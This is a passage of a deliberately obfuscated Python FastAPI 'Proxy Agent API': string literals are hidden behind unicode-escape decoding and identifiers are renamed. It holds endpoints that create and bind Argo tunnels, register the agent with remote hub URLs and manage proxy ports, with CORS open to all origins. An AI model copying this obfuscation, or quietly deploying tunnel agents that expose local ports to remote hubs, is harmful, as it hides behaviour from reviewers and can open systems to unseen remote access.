                Logger.info(codecs.decode('\\u005b\\u0041\\u0072\\u0067\\u006f\\u0042\\u0069\\u006e\\u0064\\u005d\\u0020\\u2705\\u0020\\u5df2\\u6062\\u590d\\u7ed1\\u5b9a\\u003a\\u0020', 'unicode_escape') + str(O0_var_1815) + codecs.decode('\\u0020\\u0028\\u0070\\u006f\\u0072\\u0074\\u0020', 'unicode_escape') + str(O0_var_1814) + codecs.decode('\\u0029', 'unicode_escape'))
            except ArgoTunnelError as _exc:
                Logger.warning(codecs.decode('\\u005b\\u0041\\u0072\\u0067\\u006f\\u0042\\u0069\\u006e\\u0064\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u6062\\u590d\\u7ed1\\u5b9a\\u0020', 'unicode_escape') + str(O0_var_1815) + codecs.decode('\\u0020\\u0028\\u0070\\u006f\\u0072\\u0074\\u0020', 'unicode_escape') + str(O0_var_1814) + codecs.decode('\\u0029\\u0020\\u5931\\u8d25\\u0020\\u0028', 'unicode_escape') + str(_exc.message) + codecs.decode('\\u0029\\u002c\\u0020\\u6761\\u76ee\\u4fdd\\u7559', 'unicode_escape'))
            except Exception as _exc:
                Logger.warning(codecs.decode('\\u005b\\u0041\\u0072\\u0067\\u006f\\u0042\\u0069\\u006e\\u0064\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u6062\\u590d\\u7ed1\\u5b9a\\u0020', 'unicode_escape') + str(O0_var_1815) + codecs.decode('\\u0020\\u0028\\u0070\\u006f\\u0072\\u0074\\u0020', 'unicode_escape') + str(O0_var_1814) + codecs.decode('\\u0029\\u0020\\u5f02\\u5e38\\u003a\\u0020', 'unicode_escape') + str(_exc))
    if Config.DEBUG:
        Logger.debug(codecs.decode('\\u2705\\u0020\\u7ba1\\u7406\\u5668\\u5df2\\u6302\\u8f7d\\u5230\\u0020\\u0061\\u0070\\u0070\\u002e\\u0073\\u0074\\u0061\\u0074\\u0065', 'unicode_escape'))
        Logger.debug(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020\\u0066\\u0069\\u006c\\u0065\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u003a\\u0020', 'unicode_escape') + str(app.state.file_manager))
        Logger.debug(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u003a\\u0020', 'unicode_escape') + str(app.state.task_manager))
    yield
    if Config.DEBUG:
        Logger.debug(codecs.decode('\\U0001f6d1\\u0020\\u5e94\\u7528\\u5173\\u95ed\\uff0c\\u6e05\\u7406\\u8d44\\u6e90\\u002e\\u002e\\u002e', 'unicode_escape'))
    if hasattr(app.state, codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape')):
        try:
            app.state.task_manager.stop_cron_loop()
        except:
            pass
    if hasattr(app.state, codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u005f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape')):
        try:
            app.state.argo_tunnel_manager.stop_all()
        except Exception:
            pass
    if hasattr(app.state, codecs.decode('\\u0068\\u0075\\u0062\\u005f\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0072', 'unicode_escape')):
        try:
            app.state.hub_registrar.stop_all()
        except Exception:
            pass
    if hasattr(app.state, codecs.decode('\\u006c\\u006f\\u006f\\u0070\\u0062\\u0061\\u0063\\u006b\\u005f\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')):
        try:
            await app.state.loopback_session.close()
        except Exception:
            pass
app = FastAPI(title=codecs.decode('\\u0050\\u0072\\u006f\\u0078\\u0079\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u0041\\u0050\\u0049', 'unicode_escape'), description=codecs.decode('\\u5355\\u6587\\u4ef6\\u90e8\\u7f72\\u7248\\u0020\\u002d\\u0020\\u652f\\u6301\\u7b7e\\u540d\\u8ba4\\u8bc1\\u4e0e\\u54cd\\u5e94\\u52a0\\u5bc6', 'unicode_escape'), version=Config.AGENT_VERSION, docs_url=codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u0073', 'unicode_escape') if Config.DEBUG else None, redoc_url=None, lifespan=O0_fn_56)
from fastapi.middleware.cors import CORSMiddleware
app.add_middleware(AuthEncryptMiddleware)
app.add_middleware(CORSMiddleware, allow_origins=[codecs.decode('\\u002a', 'unicode_escape')], allow_methods=[codecs.decode('\\u002a', 'unicode_escape')], allow_headers=[codecs.decode('\\u002a', 'unicode_escape')], expose_headers=[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')])

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelListResponse)
async def O0_fn_57(request: Request):
    O0_var_1817 = request.app.state.argo_tunnel_manager
    O0_var_1818 = O0_var_1817.list_tunnels()
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_1818), codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073', 'unicode_escape'): O0_var_1818}

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelCreateResponse, response_model_exclude_none=True)
async def O0_fn_58(request: Request, payload: ArgoTunnelCreateRequest=Body(...)):
    O0_var_1819 = request.app.state.argo_tunnel_manager
    O0_var_1820 = payload.port if payload.port is not None else Config.PORT
    try:
        return O0_var_1819.create_tunnel(O0_var_1820, duplicate=payload.duplicate, quic=payload.quic, shz=payload.shz, shz_name=payload.shz_name, shz_key=payload.shz_key)
    except ArgoTunnelError as exc:
        return JSONResponse(status_code=exc.status_code, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'): False, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_1820, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): exc.message})

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelDeleteResponse, response_model_exclude_none=True)
async def O0_fn_59(request: Request, payload: ArgoTunnelDeleteRequest=Body(...)):
    O0_var_1821 = request.app.state.argo_tunnel_manager
    try:
        return O0_var_1821.delete_tunnel(payload.port, tunnel_domain=payload.tunnel_domain)
    except ArgoTunnelError as exc:
        return JSONResponse(status_code=exc.status_code, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): payload.port, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): exc.message})

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f\\u002f\\u0062\\u0069\\u006e\\u0064', 'unicode_escape'), response_model=ArgoBindResponse, response_model_exclude_none=True)
async def O0_fn_60(request: Request, payload: ArgoBindRequest=Body(...)):
    O0_var_1822 = request.app.state.argo_tunnel_manager
    try:
        return O0_var_1822.bind_tunnel(payload.port, tunnel_domain=payload.tunnel_domain, shz_name=payload.shz_name, shz_key=payload.shz_key)
    except ArgoTunnelError as exc:
        return JSONResponse(status_code=exc.status_code, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0075\\u006e\\u0064', 'unicode_escape'): False, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): payload.port, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): exc.message})

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f\\u002f\\u0062\\u0069\\u006e\\u0064', 'unicode_escape'), response_model=ArgoBindResponse, response_model_exclude_none=True)
async def O0_fn_61(request: Request, payload: ArgoBindRequest=Body(...)):
    O0_var_1823 = request.app.state.argo_tunnel_manager
    try:
        return O0_var_1823.unbind_tunnel(payload.port, tunnel_domain=payload.tunnel_domain)
    except ArgoTunnelError as exc:
        return JSONResponse(status_code=exc.status_code, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0075\\u006e\\u0064', 'unicode_escape'): False, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): payload.port, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): exc.message})

def _persist_hubregs(O0_var_1824) -> bool:
    O0_var_1825 = getattr(O0_var_1824, codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
    O0_var_1826 = getattr(O0_var_1825, codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), None) if O0_var_1825 is not None else None
    if O0_var_1826 is None:
        return False
    O0_var_1827 = getattr(O0_var_1824, codecs.decode('\\u0068\\u0075\\u0062\\u005f\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0072', 'unicode_escape'), None)
    O0_var_1828 = O0_var_1827.list() if O0_var_1827 is not None else []
    return O0_var_1826.save_hubregs([{codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): O0_var_1829[codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')], codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_1829[codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')], codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_var_1829.get(codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape')) or []} for O0_var_1829 in O0_var_1828])

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0068\\u0075\\u0062', 'unicode_escape'))
async def O0_fn_62(request: Request):
    O0_var_1830 = getattr(request.app.state, codecs.decode('\\u0068\\u0075\\u0062\\u005f\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0072', 'unicode_escape'), None)
    O0_var_1831 = getattr(request.app.state, codecs.decode('\\u0068\\u0075\\u0062\\u005f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
    O0_var_1832 = O0_var_1830.list() if O0_var_1830 is not None else []
    if O0_var_1830 is None and O0_var_1831 is None:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0065\\u006e\\u0061\\u0062\\u006c\\u0065\\u0064', 'unicode_escape'): False, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u65e0\\u0020\\u0068\\u0075\\u0062\\u0020\\u6ce8\\u518c\\u0020\\u0028\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0033\\u0020\\u6216\\u0020\\u0050\\u004f\\u0053\\u0054\\u0020\\u002f\\u0061\\u0070\\u0069\\u002f\\u0068\\u0075\\u0062\\u0020\\u52a8\\u6001\\u6ce8\\u518c\\u0029', 'unicode_escape')}
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0065\\u006e\\u0061\\u0062\\u006c\\u0065\\u0064', 'unicode_escape'): bool(O0_var_1832), codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape'): O0_var_1831.snapshot() if O0_var_1831 is not None else None, codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0073', 'unicode_escape'): O0_var_1832}

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0068\\u0075\\u0062', 'unicode_escape'))
async def O0_fn_63(request: Request, payload: HubRegisterRequest=Body(...)):
    O0_var_1833 = getattr(request.app.state, codecs.decode('\\u0068\\u0075\\u0062\\u005f\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0072', 'unicode_escape'), None)
    if O0_var_1833 is None:
        return JSONResponse(status_code=500, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): False, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0075\\u0062\\u0020\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0072\\u0020\\u672a\\u521d\\u59cb\\u5316', 'unicode_escape')})
    O0_var_1834 = O0_fn_45(payload.hub)
    if not O0_var_1834.lower().startswith((codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape'))):
        return JSONResponse(status_code=422, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0068\\u0075\\u0062', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0075\\u0062\\u0020\\u5fc5\\u987b\\u4ee5\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u6216\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u5f00\\u5934', 'unicode_escape')})
    O0_var_1835, O0_var_1836, O0_var_1837 = O0_var_1833.register(O0_var_1834, payload.kname, ports=payload.ports or [], source=codecs.decode('\\u0064\\u0079\\u006e\\u0061\\u006d\\u0069\\u0063', 'unicode_escape'), wait_timeout=15.0)
    if O0_var_1836 is None or O0_var_1836 == codecs.decode('\\u0075\\u006e\\u0072\\u0065\\u0061\\u0063\\u0068\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'):
        if payload.ports:
            O0_fn_67(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'), payload.ports)
            _persist_proxyports(request.app.state)
    if O0_var_1836 is None:
        O0_var_1838 = _persist_hubregs(request.app.state)
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_1838, codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_1835}
    if O0_var_1836 == codecs.decode('\\u0075\\u006e\\u0072\\u0065\\u0061\\u0063\\u0068\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'):
        O0_var_1838 = _persist_hubregs(request.app.state)
        return JSONResponse(status_code=500, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_1838, codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_1836, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): O0_var_1837, codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_1835})
    O0_var_1839 = 409 if O0_var_1836 in (codecs.decode('\\u006e\\u0061\\u006d\\u0065\\u005f\\u0074\\u0061\\u006b\\u0065\\u006e', 'unicode_escape'), codecs.decode('\\u0066\\u0075\\u006c\\u006c', 'unicode_escape')) else 422
    return JSONResponse(status_code=O0_var_1839, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): False, codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_1836, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): O0_var_1837, codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_1835})

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0068\\u0075\\u0062', 'unicode_escape'))
async def O0_fn_64(request: Request, payload: HubDeleteRequest=Body(...)):
    O0_var_1840 = getattr(request.app.state, codecs.decode('\\u0068\\u0075\\u0062\\u005f\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0072', 'unicode_escape'), None)
    if O0_var_1840 is None:
        return JSONResponse(status_code=404, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u65e0\\u0020\\u0068\\u0075\\u0062\\u0020\\u6ce8\\u518c', 'unicode_escape')})
    O0_var_1841 = O0_var_1840.unregister(payload.kname)
    if O0_var_1841 is None:
        return JSONResponse(status_code=404, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020', 'unicode_escape') + str(payload.kname) + codecs.decode('\\u0020\\u672a\\u6ce8\\u518c', 'unicode_escape')})
    O0_var_1842 = _persist_hubregs(request.app.state)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_1842, codecs.decode('\\u0072\\u0065\\u006d\\u006f\\u0076\\u0065\\u0064', 'unicode_escape'): O0_var_1841}
_PROXY_STRIPPED_AUTH_HEADERS = (codecs.decode('\\u0078\\u002d\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'), codecs.decode('\\u0078\\u002d\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u0078\\u002d\\u0061\\u0075\\u0074\\u0068\\u002d\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'), codecs.decode('\\u0078\\u002d\\u0061\\u0065\\u0073\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0078\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'))
_PROXY_METHODS = [codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape'), codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape'), codecs.decode('\\u0050\\u0055\\u0054', 'unicode_escape'), codecs.decode('\\u0044\\u0045\\u004c\\u0045\\u0054\\u0045', 'unicode_escape'), codecs.decode('\\u0050\\u0041\\u0054\\u0043\\u0048', 'unicode_escape'), codecs.decode('\\u0048\\u0045\\u0041\\u0044', 'unicode_escape'), codecs.decode('\\u004f\\u0050\\u0054\\u0049\\u004f\\u004e\\u0053', 'unicode_escape')]
PROXY_GROUP_HUB = codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')
PROXY_GROUP_LOCAL = codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')
_PROXY_RUNTIME_PORTS_LOCK = threading.Lock()
_PROXY_RUNTIME_PORTS = {PROXY_GROUP_HUB: set(), PROXY_GROUP_LOCAL: set()}

def _proxy_env_ports(O0_var_1843):
    return {codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): Config.KHUB_PORTS, codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): Config.KPROXY_PORTS}.get(O0_var_1843, ())

def O0_fn_65(O0_var_1844) -> list:
    with _PROXY_RUNTIME_PORTS_LOCK:
        return sorted(set(_proxy_env_ports(O0_var_1844)) | _PROXY_RUNTIME_PORTS.get(O0_var_1844, set()))

def _clean_port_list(ports) -> set:
    O0_var_1845 = set()
    for O0_var_1846 in ports or []:
        if isinstance(O0_var_1846, bool):
            continue
        try:
            O0_var_1847 = int(O0_var_1846)
        except (TypeError, ValueError):
            continue
        if 1 <= O0_var_1847 <= 65535:
            O0_var_1845.add(O0_var_1847)
    return O0_var_1845

def O0_fn_66(O0_var_1848, ports) -> None:
    O0_var_1849 = _clean_port_list(ports)
    with _PROXY_RUNTIME_PORTS_LOCK:
        _PROXY_RUNTIME_PORTS.setdefault(O0_var_1848, set())
        _PROXY_RUNTIME_PORTS[O0_var_1848].clear()
        _PROXY_RUNTIME_PORTS[O0_var_1848].update(O0_var_1849)

def O0_fn_67(O0_var_1850, ports) -> None:
    O0_var_1851 = _clean_port_list(ports)
    if not O0_var_1851:
        return
    with _PROXY_RUNTIME_PORTS_LOCK:
        _PROXY_RUNTIME_PORTS.setdefault(O0_var_1850, set()).update(O0_var_1851)

def _persist_proxyports(O0_var_1852) -> bool:
    O0_var_1853 = getattr(O0_var_1852, codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
    O0_var_1854 = getattr(O0_var_1853, codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), None) if O0_var_1853 is not None else None
    if O0_var_1854 is None:
        return False
    return O0_var_1854.save_proxyports({codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): O0_fn_68(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')), codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): O0_fn_68(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'))})

def O0_fn_68(O0_var_1855) -> list:
    with _PROXY_RUNTIME_PORTS_LOCK:
        return sorted(_PROXY_RUNTIME_PORTS.get(O0_var_1855, set()))

def _proxy_error_response(O0_var_1856):
    O0_var_1857 = {codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u006c\\u006c\\u006f\\u0077\\u0065\\u0064', 'unicode_escape'): 403, codecs.decode('\\u0062\\u006f\\u0064\\u0079\\u005f\\u0074\\u006f\\u006f\\u005f\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'): 413}.get(O0_var_1856.code, 502)
    return JSONResponse(status_code=O0_var_1857, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_1856.code, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): O0_var_1856.message})

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067', 'unicode_escape'))
async def O0_fn_69(request: Request):
    O0_var_1858 = getattr(request.app.state, codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
    O0_var_1859 = getattr(O0_var_1858, codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), None) if O0_var_1858 is not None else None
    O0_var_1860 = bool(O0_var_1859 is not None and getattr(O0_var_1859, codecs.decode('\\u0065\\u006e\\u0061\\u0062\\u006c\\u0065\\u0064', 'unicode_escape'), False) and (not getattr(O0_var_1859, codecs.decode('\\u006c\\u006f\\u0063\\u006b\\u0065\\u0064', 'unicode_escape'), False)))
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): {codecs.decode('\\u0065\\u006e\\u0076\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): sorted(set(Config.KHUB_PORTS)), codecs.decode('\\u0072\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_fn_68(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')), codecs.decode('\\u0065\\u0066\\u0066\\u0065\\u0063\\u0074\\u0069\\u0076\\u0065\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_fn_65(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'))}, codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): {codecs.decode('\\u0065\\u006e\\u0076\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): sorted(set(Config.KPROXY_PORTS)), codecs.decode('\\u0072\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_fn_68(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')), codecs.decode('\\u0065\\u0066\\u0066\\u0065\\u0063\\u0074\\u0069\\u0076\\u0065\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_fn_65(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'))}, codecs.decode('\\u006b\\u0073\\u0074\\u006f\\u0072\\u0065\\u005f\\u0065\\u006e\\u0061\\u0062\\u006c\\u0065\\u0064', 'unicode_escape'): O0_var_1860}

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067', 'unicode_escape'))
async def O0_fn_70(request: Request, payload: dict=Body(...)):
    if not isinstance(payload, dict):
